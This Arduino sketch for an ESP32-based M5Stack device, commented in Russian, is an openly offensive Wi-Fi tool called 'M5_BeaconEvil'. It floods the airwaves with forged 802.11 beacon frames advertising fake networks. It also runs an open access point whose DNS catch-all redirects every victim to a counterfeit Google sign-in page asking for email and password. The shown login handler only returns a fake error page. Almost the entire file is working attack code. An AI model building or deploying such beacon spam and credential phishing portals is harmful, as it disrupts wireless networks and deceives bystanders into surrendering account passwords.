#include <SPIFFS.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <M5Unified.h>

// ================= НАСТРОЙКИ =================
const char* ssid     = "M5_BeaconEvil"; 

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

bool isSpamming = false;
bool isEvilPortalActive = true; 
unsigned long lastBeaconTime = 0;
int packetCount = 0;
int currentBurst = 100; // Начинаем со 100, потом растет

// ================= ПРОТОТИПЫ =================
void drawUI();
void sendBeaconSpam();
void setupServer();

// ================= БЕКОН СПАМ =================
void sendBeaconSpam() {
  uint8_t packet[128] = {0};
  
  packet[0] = 0x80; packet[1] = 0x00; packet[2] = 0x00; packet[3] = 0x00; 
  for(int i=4; i<10; i++) packet[i] = 0xFF; 
  for(int i=10; i<16; i++) packet[i] = random(0, 255);
  for(int i=16; i<22; i++) packet[i] = packet[i-6];
  packet[22] = 0x00; packet[23] = 0x00;
  for(int i=24; i<32; i++) packet[i] = random(0, 255);
  packet[32] = 0x64; packet[33] = 0x00; packet[34] = 0x11; packet[35] = 0x04;

  // Рандомим имя с бОльшим разбросом
  char ssidBuf[32];
  int type = random(0, 5);
  if (type == 0) sprintf(ssidBuf, "Free_WiFi_%d", random(0, 5000));
  else if (type == 1) sprintf(ssidBuf, "Hack_Me_%d", random(0, 5000));
  else if (type == 2) sprintf(ssidBuf, "Virus_%d", random(0, 5000));
  else if (type == 3) sprintf(ssidBuf, "M5Stack_%d", random(0, 5000));
  else sprintf(ssidBuf, "Error_%d", random(0, 5000));

  int ssidLen = strlen(ssidBuf);
  int len = 36;
  
  packet[len++] = 0x00; packet[len++] = ssidLen;
  memcpy(&packet[len], ssidBuf, ssidLen); len += ssidLen;
  packet[len++] = 0x03; packet[len++] = 0x01; 
  packet[len++] = random(1, 14); 

  esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false);
  packetCount++;
}

// ================= HTML WEBUI =================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE HTML><html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>M5_BeaconEvil</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; font-family: 'Courier New', monospace; }
    body { background: #000; color: #fff; overflow: hidden; }
    #app { height: 100vh; display: flex; flex-direction: column; padding: 20px; }
    
    h1 { font-size: 20px; color: #0f0; margin-bottom: 20px; text-transform: uppercase; border-bottom: 2px dashed #0f0; padding-bottom: 10px; font-weight: bold; letter-spacing: 1px; text-align: center; }
    
    button { background: #000; color: #fff; border: 2px solid #fff; padding: 20px; width: 100%; font-weight: bold; font-size: 18px; cursor: pointer; margin-bottom: 15px; text-transform: uppercase; }
    button:active { background: #fff; color: #000; }
    button.active { background: #0f0; color: #000; border-color: #0f0; }
    
    .status-box { padding: 15px; background: #000; border: 2px solid #fff; margin-bottom: 20px; font-size: 14px; text-transform: uppercase; text-align: center; }
    .status-on { color: #0f0; border-color: #0f0; }
    .status-off { color: #f00; border-color: #f00; }
    
    .info { font-size: 12px; color: #888; text-align: center; margin-top: 20px; }
  </style>
</head>
<body>
  <div id="app">
    <h1>M5_BeaconEvil</h1>
    
    <div class="status-box" id="status-wifi">BEACON SPAM: ВЫКЛЮЧЕН</div>
    <button id="btnWifi" onclick="toggleWifi()">ЗАПУСТИТЬ СПАМ (НАКОПИТЕЛЬНО)</button>

    <div class="status-box" id="status-portal">EVIL PORTAL: АКТИВЕН</div>
    <button id="btnPortal" onclick="togglePortal()">ОСТАНОВИТЬ ПОРТАЛ</button>

    <div class="info">Подключись к сети M5_BeaconEvil без пароля. Портал откроется автоматически.</div>
  </div>

  <script>
    let isWifiOn = false;
    let isPortalOn = true;

    function toggleWifi() {
      fetch(isWifiOn ? '/wifi/off' : '/wifi/on').then(r => r.text()).then(() => {
        isWifiOn = !isWifiOn;
        updateUI();
      });
    }

    function togglePortal() {
      fetch(isPortalOn ? '/portal/off' : '/portal/on').then(r => r.text()).then(() => {
        isPortalOn = !isPortalOn;
        updateUI();
      });
    }

    function updateUI() {
      let btnW = document.getElementById('btnWifi');
      let statW = document.getElementById('status-wifi');
      if(isWifiOn) { btnW.innerText = 'ОСТАНОВИТЬ СПАМ'; btnW.classList.add('active'); statW.innerText = 'BEACON SPAM: НАКОПИТЕЛЬНЫЙ'; statW.className = 'status-box status-on'; }
      else { btnW.innerText = 'ЗАПУСТИТЬ СПАМ (НАКОПИТЕЛЬНО)'; btnW.classList.remove('active'); statW.innerText = 'BEACON SPAM: ВЫКЛЮЧЕН'; statW.className = 'status-box status-off'; }

      let btnP = document.getElementById('btnPortal');
      let statP = document.getElementById('status-portal');
      if(isPortalOn) { btnP.innerText = 'ОСТАНОВИТЬ ПОРТАЛ'; btnP.classList.add('active'); statP.innerText = 'EVIL PORTAL: АКТИВЕН'; statP.className = 'status-box status-on'; }
      else { btnP.innerText = 'ЗАПУСТИТЬ ПОРТАЛ'; btnP.classList.remove('active'); statP.innerText = 'EVIL PORTAL: ВЫКЛЮЧЕН'; statP.className = 'status-box status-off'; }
    }

    fetch('/status').then(r => r.text()).then(t => {
      if(t.includes('WIFI_ON')) isWifiOn = true;
      if(t.includes('PORTAL_ON')) isPortalOn = true;
      updateUI();
    });
  </script>
</body>
</html>
)rawliteral";

// ================= EVIL PORTAL HTML =================
const char portal_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Roboto', sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
  .container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
  .logo { text-align: center; margin-bottom: 20px; }
  h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 10px; }
  p { text-align: center; margin-bottom: 20px; color: #5f6368; }
  input { width: 100%; padding: 12px; border: 1px solid #dadce0; border-radius: 4px; margin-bottom: 15px; font-size: 16px; outline: none; }
  input:focus { border: 2px solid #1a73e8; padding: 11px; }
  button { width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; cursor: pointer; font-weight: 500; }
  button:hover { background: #1b66c9; }
</style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <svg viewBox="0 0 24 24" width="75" height="75"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
    </div>
    <h1>Вход</h1>
    <p>Используйте аккаунт Google</p>
    <form action="/login" method="POST">
      <input type="email" name="email" placeholder="Email" required>
      <input type="password" name="password" placeholder="Пароль" required>
      <button type="submit">Далее</button>
    </form>
  </div>
</body></html>
)rawliteral";

// ================= ОТРИСОВКА МЕНЮ =================
void drawUI() {
  M5.Display.fillScreen(BLACK);
  M5.Display.setTextColor(WHITE);
  M5.Display.setTextSize(2);
  M5.Display.setCursor(10, 10);
  M5.Display.print("M5_BeaconEvil");
  M5.Display.drawLine(0, 35, 135, 35, GREEN);
  
  M5.Display.setTextSize(1);
  M5.Display.setCursor(10, 45);
  M5.Display.print("Spam: ");
  M5.Display.setTextColor(isSpamming ? GREEN : RED);
  M5.Display.print(isSpamming ? "ACTIVE" : "OFF");
  
  M5.Display.setTextColor(WHITE);
  M5.Display.setCursor(10, 60);
  M5.Display.print("Portal: ");
  M5.Display.setTextColor(isEvilPortalActive ? GREEN : RED);
  M5.Display.print(isEvilPortalActive ? "ACTIVE" : "OFF");

  M5.Display.setTextColor(WHITE);
  M5.Display.setCursor(10, 75);
  M5.Display.print("Packets: "); M5.Display.print(packetCount);
  M5.Display.setCursor(10, 90);
  M5.Display.print("IP: ");
  M5.Display.print(WiFi.softAPIP());
}

// ================= ВЕБ-СЕРВЕР =================
void setupServer() {
  server.on("/", HTTP_GET, [](){ server.send_P(200, "text/html", index_html); });
  
  server.on("/wifi/on", HTTP_GET, [](){ 
    isSpamming = true; 
    currentBurst = 100; // Сбрасываем счетчик при старте
    drawUI(); 
    server.send(200, "text/plain", "ON"); 
  });
  
  server.on("/wifi/off", HTTP_GET, [](){ 
    isSpamming = false; 
    drawUI(); 
    server.send(200, "text/plain", "OFF"); 
  });
  
  server.on("/portal/on", HTTP_GET, [](){
    isEvilPortalActive = true;
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
    drawUI();
    server.send(200, "text/plain", "PORTAL ON");
  });

  server.on("/portal/off", HTTP_GET, [](){
    isEvilPortalActive = false;
    dnsServer.stop();
    drawUI();
    server.send(200, "text/plain", "PORTAL OFF");
  });

  server.on("/status", HTTP_GET, [](){
    String status = "";
    if (isSpamming) status += "WIFI_ON,";
    if (isEvilPortalActive) status += "PORTAL_ON,";
    server.send(200, "text/plain", status);
  });

  server.on("/login", HTTP_POST, [](){
    server.send(200, "text/html", "<html><body style='background:#000;color:#fff;text-align:center;padding:50px;'><h1>ОШИБКА</h1><p>Неверный пароль. Попробуйте еще раз.</p></body></html>");
  });

  server.onNotFound([](){
    if (isEvilPortalActive) {
      server.send_P(200, "text/html", portal_html);
    } else {
      server.send(404, "text/plain", "Not Found");
    }
  });

  server.begin();
}

// ================= SETUP =================
void setup() {
  auto cfg = M5.config();
  M5.begin(cfg);
  Serial.begin(115200);
  
  if(!SPIFFS.begin(true)) Serial.println("SPIFFS Error");

  WiFi.mode(WIFI_AP);
  WiFi.softAP("M5_BeaconEvil"); // Без пароля

  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  setupServer();
  
  if (isEvilPortalActive) {
    dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  }
  
  drawUI();
}

// ================= LOOP =================
void loop() {
  server.handleClient();
  if (isEvilPortalActive) dnsServer.processNextRequest();
  M5.update();

  // НАКОПИТЕЛЬНЫЙ СПАМ: каждые 5 секунд отправляем 'currentBurst' пакетов и увеличиваем счетчик
  if (isSpamming && (millis() - lastBeaconTime >= 5000)) {
    lastBeaconTime = millis();
    
    // Отправляем текущую пачку
    for(int i = 0; i < currentBurst; i++) {
      sendBeaconSpam();
      delay(1); // Микро-пауза, чтобы Wi-Fi стек не захлебнулся
    }
    
    // Увеличиваем счетчик для следующего цикла
    currentBurst += 100;
    
    // Если счетчик стал слишком большим (например, больше 2000), сбрасываем его,
    // чтобы стик не ушел в бесконечный цикл на 5 секунд (он не будет успевать обновлять веб-интерфейс)
    if (currentBurst > 2000) {
      currentBurst = 100;
    }
    
    drawUI();
  }
}
